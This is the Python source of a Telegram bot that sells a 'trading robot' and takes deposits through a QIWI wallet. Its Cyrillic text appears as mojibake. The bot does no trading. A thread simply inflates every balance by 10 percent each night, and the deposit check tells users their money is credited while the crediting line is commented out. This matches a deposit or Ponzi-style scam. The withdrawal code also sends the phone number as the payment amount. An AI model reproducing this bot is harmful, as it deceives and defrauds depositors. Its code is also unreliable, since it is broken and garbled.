from logging import exception
from os import name
import telebot


from telebot.types import Message
#from types import CellType
import config
from telebot import types
import sqlite3
from random import randint
from time import sleep

from datetime import date, datetime
from threading import Thread
import random
import string
import json
import requests
import time
global client
client = telebot.TeleBot(config.CONFIG['token'])
global api
global token
global phone
global comiss
comiss = 1



global minimize_amount
minimize_amount = 7




token = config.CONFIG['qiwi']
phone = config.CONFIG['phone']

threads=[]
global procent_ot_pribali
procent_ot_pribali = 10

#–§—É–Ω–∫—Ü–∏—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∫–ª—é—á–µ–π –¥–ª—è –æ–ø–ª–∞—Ç—ã

def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))



#—Ñ—É–Ω–∫—Ü–∏—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å—è
def update():
    pribal = 0
    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
        
    )""")

    while True:
        tt = datetime.now()
        
        if tt.hour == 0:
            for x in cursor.execute(f"SELECT pay_money FROM users WHERE user_id = '{'AdminUsers'}'"):
                pribal = x[0]

            formul = 1 + pribal /100
            cursor.execute('''SELECT * FROM users''')
            records = cursor.fetchall()
            id = ''

            for row in records:
                
                cursor.execute("UPDATE users SET cash = ? WHERE user_id = ?", (row[2] * formul, row[0]))
                db.commit()


        
        sleep(40)




# –ü–µ—Ä–µ–≤–æ–¥ –Ω–∞ QIWI –ö–æ—à–µ–ª–µ–∫
def send_p2p(api_access_token, to_qw, sum_p2p):
    s = requests.Session()
    
    sum_p2p = str(sum_p2p) + '.00'
    s.headers = {'content-type': 'application/json'}
    s.headers['authorization'] = 'Bearer ' + api_access_token
    s.headers['User-Agent'] = 'Android v3.2.0 MKT'
    s.headers['Accept'] = 'application/json'
    
    postjson = {"id":str(int(time.time() * 1000)),"sum":{"amount":str(to_qw),"currency":"643"},"paymentMethod":{"type":"Account","accountId":"643"}, "comment":"–í—ã–≤–æ–¥ –¥–µ–Ω–µ–≥","fields":{"account": to_qw}}
    
    
    res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments', json = postjson)
    return res.json()


# –ò—Å—Ç–æ—Ä–∏—è –ø–ª–∞—Ç–µ–∂–µ–π - –ø–æ—Å–ª–µ–¥–Ω–∏–µ –∏ —Å–ª–µ–¥—É—é—â–∏–µ n –ø–ª–∞—Ç–µ–∂–µ–π
def payment_history_last(my_login, api_access_token, rows_num, next_TxnId, next_TxnDate):
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' + api_access_token  
    parameters = {'rows': rows_num, 'nextTxnId': next_TxnId, 'nextTxnDate': next_TxnDate}
    h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + my_login + '/payments', params = parameters)
    return h.json()



#–ó–∞–ø–∏—Å—å –Ω–æ–≤–æ–≥–æ —é–∑–µ—Ä–∞
def write_users(message):
    
    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
        
    )""")
    db.commit()
    cursor.execute(f"SELECT user_id FROM users WHERE user_id = '{message.chat.id}'")
    if cursor.fetchone() is None:
        
        users_list = [message.chat.id, 'False', 0, 0, 'nopay', 0, 'False', 'True']

        cursor.execute("INSERT INTO users VALUES(?,?,?,?,?,?,?,?);", users_list)
        db.commit()
        cursor.execute(f"SELECT user_id FROM users WHERE user_id = '{'AdminUsers'}'")
        if cursor.fetchone() is None:

            #! –ü–æ–ª–µ pay_money –∞–¥–º–∏–Ω–∞ –∑–∞–Ω–æ—Å–∏—Ç—å—Å—è –ø—Ä–æ—Ü–µ–Ω—Ç –ø—Ä–∏–±—ã–ª–∏
            users_list = ['AdminUsers', 'True', 0, 0, 'admin', procent_ot_pribali, 'False', 'True']


            cursor.execute("INSERT INTO users VALUES(?,?,?,?,?,?,?,?);", users_list)
            db.commit()

        for i in cursor.execute(f"SELECT usersinbot FROM users WHERE user_id = '{'AdminUsers'}'"):
            users_in_bot = i[0]
        
            
        cursor.execute(f"UPDATE users SET usersinbot = {1 + int(users_in_bot)} WHERE user_id = '{'AdminUsers'}'")
        db.commit()
    main(message)

        



#—Ñ—É–Ω–∫—Ü–∏—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞
def pay(message):
    
    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
        
    )""")
    
    
    

    comment = generate_random_string(7)

    cursor.execute("UPDATE users SET pay = ? WHERE user_id = ?", (comment, message.chat.id))
    db.commit()
    
    
    
    markup_inline = types.InlineKeyboardMarkup()

    item_pay = types.InlineKeyboardButton(text = '–û–ø–ª–∞—Ç–∏—Ç—å', url='qiwi.com/p/79259058006') #qiwi.com/p/79259058006
    item_check = types.InlineKeyboardButton(text = '–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–ª–∞—Ç—ë–∂', callback_data='check')
    item_back = types.InlineKeyboardButton(text = '–ù–∞–∑–∞–¥', callback_data='bck')
    markup_inline.add(item_pay)
    markup_inline.add(item_check)
    markup_inline.add(item_back)
    client.send_message(message.chat.id, f'–ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –æ–ø–ª–∞—Ç–∏—Ç—å –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –∫ –æ–ø–ª–∞—Ç–µ. –í –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è—Ö –∫ –ø–µ—Ä–µ–≤–æ–¥—É —É–∫–∞–∂–∏—Ç–µ –∫–ª—é—á - {comment}, –µ—Å–ª–∏ –í—ã –Ω–µ —É–∫–∞–∂–∏—Ç–µ –µ–≥–æ, –¥–µ–Ω—å–≥–∏ –Ω–µ –∑–∞—á–∏—Å–ª—è—Ç—Å—è –Ω–∞ —Å—á—ë—Ç. –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –µ—ë, –Ω–∞–∂–∞–≤ –Ω–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â—É—é –∫–Ω–æ–ø–∫—É. –£—á—Ç–∏—Ç–µ, —á—Ç–æ —Å—É–º–º–∞ –ø–æ—Å—Ç—É–ø–∏–≤—à–∞—è –Ω–∞ —Å—á—ë—Ç –±—É–¥–µ—Ç —Å —É—á—ë—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏ QIWI. –ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Ä–∞–∑–º–µ—Ä –∫–æ–º–∏—Å—Å–∏–∏ –º–æ–∂–Ω–æ –ø—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ. –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è - {str(minimize_amount)}—Ä, –µ—Å–ª–∏ —Å—É–º–º–∞ –æ–ø–ª–∞—Ç—ã –±—É–¥–µ—Ç –º–µ–Ω—å—à–µ –¥–µ–Ω—å–≥–∏ –Ω–µ –∑–∞—á–∏—Å–ª—è—Ç—å—Å—è –Ω–∞ —Å—á—ë—Ç.', reply_markup=markup_inline)
    
        

    
#aeyrwbz –≤—ã–≤–æ–¥–∞ –¥–µ–Ω–µ–≥
def money_exit(message):
    
    if '+' not in message.text.lower():
        client.send_message(message.chat.id, '–í–∞—à –Ω–æ–º–µ—Ä –Ω–µ –ø–æ–¥—Ö–æ–¥–∏—Ç –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞')
        main(message)
        return
    
    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
        
    )""")
    
    
    balance = 0
    
    for i in cursor.execute(f"SELECT cash FROM users WHERE user_id = '{message.chat.id}'"):
        balance = i[0]
        
    exit2 = int(balance * comiss)
    pay = send_p2p(token, str(message.text), str(exit2))
    print(pay)
    
    

    try:
        client.send_message(message.chat.id, pay['message'])
        sleep(1)

    except KeyError:

        cursor.execute("UPDATE users SET cash = ? WHERE user_id = ?", (0, message.chat.id))
        db.commit()
        client.send_message(message.chat.id, '–û–ø–ª–∞—Ç–∞ –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ')
    main(message)



#–°–æ–æ–±—â–µ–Ω–∏–µ —Å –ø—Ä–∞–≤–∏–ª–∞–º–∏
def reg(message):
    markup_inline = types.InlineKeyboardMarkup()

    item_ok = types.InlineKeyboardButton(text = '–ü—Ä–∏–Ω—è—Ç—å –ø—Ä–∞–≤–∏–ª–∞', callback_data='ok')
    markup_inline.add(item_ok)
    client.send_message(message.chat.id, '–ü—Ä–∞–≤–∏–ª–∞', reply_markup=markup_inline) #!–°–¥–µ—Å—å –Ω–∞–¥–æ –ø–æ–º–µ–Ω—è—Ç—å —Ç–µ–∫—Å—Ç





#–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
def main(message):  # sourcery no-metrics
    balance = 0
    users = 0
    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
        
    )""")
    
    
    
    
    
    global qrule
    qrule = 'False'
    
    for x in cursor.execute(f"SELECT qrule FROM users WHERE user_id = '{message.chat.id}'"):
        qrule = x[0].strip()
    
    if qrule == 'True':
    

        for i in cursor.execute(f"SELECT cash FROM users WHERE user_id = '{message.chat.id}'"):
            balance = i[0]
        
        if balance > 0:
            cursor.execute("UPDATE users SET qpay = ? WHERE user_id = ?", ('True', message.chat.id))
            db.commit()
            torg = 'False'
            for i in cursor.execute(f"SELECT torg FROM users WHERE user_id = '{message.chat.id}'"):
                torg = i[0]
            markup_reply = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_balance = types.KeyboardButton('üí± –û–ø–ª–∞—Ç–∏—Ç—å —Ç–æ—Ä–≥–æ–≤–æ–≥–æ —Ä–æ–±–æ—Ç–∞')
            item_exit = types.KeyboardButton('üí∏ –í—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏')
            item_help = types.KeyboardButton('‚ùì –¢–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∫–∞')
            if torg == 'False':

                
                
                item_torg = types.KeyboardButton('üü¢ –ù–∞—á–∞—Ç—å —Ç–æ—Ä–≥–æ–≤–∞—Ç—å')
                
                
            else:
                item_torg = types.KeyboardButton('üî¥ –ó–∞–∫–æ–Ω—á–∏—Ç—å —Ç–æ—Ä–≥–æ–≤–∞—Ç—å')
            
            vip = '–û–±—Å—É–∂–¥–µ–Ω–∏—è –ø–æ –ø–æ–≤–æ–¥—É –±–æ—Ç–∞ –ø—Ä–æ–≤–æ–¥—è—Ç—å—Å—è –≤ —á–∞—Ç–µ: https://t.me/joinchat/ZQYVR7Gwl5AxM2Ni'
            markup_reply.add(item_balance, item_exit)
            markup_reply.add(item_torg, item_help)
            
            
            for i in cursor.execute(f"SELECT usersinbot FROM users WHERE user_id = '{'AdminUsers'}'"):
                users = i[0]
        else:
            vip = ''
            markup_reply = types.ReplyKeyboardMarkup(resize_keyboard=True)
            item_balance = types.KeyboardButton('üí± –û–ø–ª–∞—Ç–∏—Ç—å —Ç–æ—Ä–≥–æ–≤–æ–≥–æ —Ä–æ–±–æ—Ç–∞')
            item_info = types.KeyboardButton('‚ÑπÔ∏è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è')
            item_help = types.KeyboardButton('‚ùì –¢–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∫–∞')
            markup_reply.add(item_balance)
            markup_reply.add(item_info, item_help)
            for i in cursor.execute(f"SELECT usersinbot FROM users WHERE user_id = '{'AdminUsers'}'"):
                users = i[0]
        
        
        
        client.send_message(message.chat.id, f'''
üí≤ –í–∞—à –±–∞–ª–∞–Ω—Å - {balance}
üÜî –í–∞—à ID - {message.chat.id}
üôé‚Äç‚ôÇÔ∏è –ß–∏—Å–ª–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π - {users}
{vip}''', reply_markup=markup_reply)


    else:

        reg(message)



@client.message_handler(commands=['start'])
def welcom(message):


    
    main(message)
    



@client.message_handler(content_types=['text'])
def get_text(message):

    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
        
    )""")
    markup_inline = types.InlineKeyboardMarkup()
    item_back = types.InlineKeyboardButton(text = '–ù–∞–∑–∞–¥', callback_data='bck')
    
    markup = types.ReplyKeyboardRemove(selective=False)
    if '–æ–ø–ª–∞—Ç–∏—Ç—å —Ç–æ—Ä–≥–æ–≤–æ–≥–æ —Ä–æ–±–æ—Ç–∞' in message.text.lower():
        markup_inline.add(item_back)
        
        
        
        pay(message)
        
        
    elif '–∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è' in message.text.lower():

        markup_inline.add(item_back)

        
        
        
        client.send_message(message.chat.id, '–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è', reply_markup=markup_inline)
    elif '—Ç–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∫–∞' in message.text.lower():
        markup_inline.add(item_back)

        
        
        
        client.send_message(message.chat.id, '–¢–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∫–∞: @Nncode', reply_markup=markup_inline)
    elif '–≤—ã–≤–µ—Å—Ç–∏ –¥–µ–Ω—å–≥–∏' in message.text.lower():
        markup_inline.add(item_back)

        balance = 0
        for i in cursor.execute(f"SELECT cash FROM users WHERE user_id = '{message.chat.id}'"):
                balance = i[0]

        
        client.send_message(message.chat.id, f'–û—Ç–ø—Ä–∞–≤—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ QIWI –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞ –¥–µ–Ω–µ–≥. –ü—Ä–∏–º–µ—Ä –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ - +79021234567, –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –Ω–∞—á–∏–Ω–∞–π—Ç–µ —Å–æ –∑–Ω–∞–∫–∞ +. –î–µ–Ω—å–≥–∏ –≤—ã–≤–æ–¥—è—Ç—Å—è —Å –∫–æ–º–∏—Å—Å–∏–µ–π. –ó–∞ —Ä–∞–∑ –≤—ã–≤–æ–¥–∏—Ç—Å—è –≤—Å—è —Å—É–º–º–∞ –∫–æ—à–µ–ª—å–∫–∞ —Å –∫–æ–º–∏—Å—Å–∏–µ–π -{int(balance * comiss)}', reply_markup=markup_inline)
        client.register_next_step_handler(message, money_exit)
    elif '–∑–∞–∫–æ–Ω—á–∏—Ç—å —Ç–æ—Ä–≥–æ–≤–∞—Ç—å' in message.text.lower():
        cursor.execute(f"UPDATE users SET torg = ? WHERE user_id = ?", ('False', message.chat.id))
        db.commit()
        client.send_message(message.chat.id, '–¢–æ—Ä–≥–æ–≤–ª—è –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞')
        main(message)
    elif '–Ω–∞—á–∞—Ç—å —Ç–æ—Ä–≥–æ–≤–∞—Ç—å' in message.text.lower():
        cursor.execute(f"UPDATE users SET torg = ? WHERE user_id = ?", ('True', message.chat.id))
        db.commit()
        client.send_message(message.chat.id, '–¢–æ—Ä–≥–æ–≤–ª—è –ó–∞–ø—É—â–µ–Ω–∞')
        main(message)


@client.callback_query_handler(func=lambda call: True)
def answer(call):
    db = sqlite3.connect('users.db')
    cursor = db.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id TEXT,
        qpay TEXT,
        cash INTEGER,
        usersinbot INTEGER,
        pay TEXT,
        pay_money INTEGER,
        torg TEXT,
        qrule TEXT
    )""")
    db.commit()
    
        
    if call.data == 'ok':
        client.delete_message(call.message.chat.id, call.message.message_id)
        
        write_users(call.message)
        


    elif call.data == 'bck':
        client.delete_message(call.message.chat.id, call.message.message_id)
        cursor.execute("UPDATE users SET pay = ? WHERE user_id = ?", ('nopay', call.message.chat.id))
        db.commit()
        main(call.message)
    elif call.data == 'check':
        
        comment = ''

        for i in cursor.execute(f"SELECT pay FROM users WHERE user_id = '{call.message.chat.id}'"):
            comment = i[0]
        # –ø–æ—Å–ª–µ–¥–Ω–∏–µ 20 –ø–ª–∞—Ç–µ–∂–µ–π
        last_payments = payment_history_last(phone, token, '10','','')
        
        for payment in last_payments['data']:
            qcomment = payment['comment']
            if comment in qcomment:

                balance = 0
                for x in cursor.execute(f"SELECT cash FROM users WHERE user_id = '{call.message.chat.id}'"):
                    balance = x[0]
                qpay2 = True

                amount = payment['total']['amount']
                if int(amount) >= minimize_amount:

                    cursor.execute("UPDATE users SET pay = ? WHERE user_id = ?", ('nopay', call.message.chat.id))
                    db.commit()
                    #cursor.execute("UPDATE users SET cash = ? WHERE user_id = ?", (int(balance) + int(amount), call.message.chat.id))
                    db.commit()
                    client.send_message(call.message.chat.id, '–û–ø–ª–∞—Ç–∞ –Ω–∞–π–¥–µ–Ω–∞. –î–µ–Ω—å–≥–∏ –∑–∞–Ω–µ—Å–Ω—ã –Ω–∞ —Å—á—ë—Ç.')
                else:
                    client.send_message(call.message.chat.id, f'–°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –º–µ–Ω—å—à–µ {minimize_amount} —Ä—É–±–ª–µ–π. –î–µ–Ω—å–≥–∏ –Ω–µ –∑–∞—á–∏—Å–ª–µ–Ω—ã –Ω–∞ —Å—á—ë—Ç')
                
                
                main(call.message)
                break

            else:
                qpay2 = False
        if qpay2 is False:

            client.send_message(call.message.chat.id, '–û–ø–ª–∞—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ï—Å–ª–∏ –≤—ã –ø—Ä–æ–∏–∑–≤–µ–ª–∏ –æ–ø–ª–∞—Ç—É –ø–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ–º–Ω–æ–∂–∫–æ –∏ –µ—â—ë —Ä–∞–∑ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –ø—Ä–æ–≤–µ—Ä–∫—É. –¢–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∞–∫–∞: @Nncode')


thread1=Thread(target=update); threads.append(thread1)
for t in threads:
    t.start()




client.polling(none_stop=True, interval=0)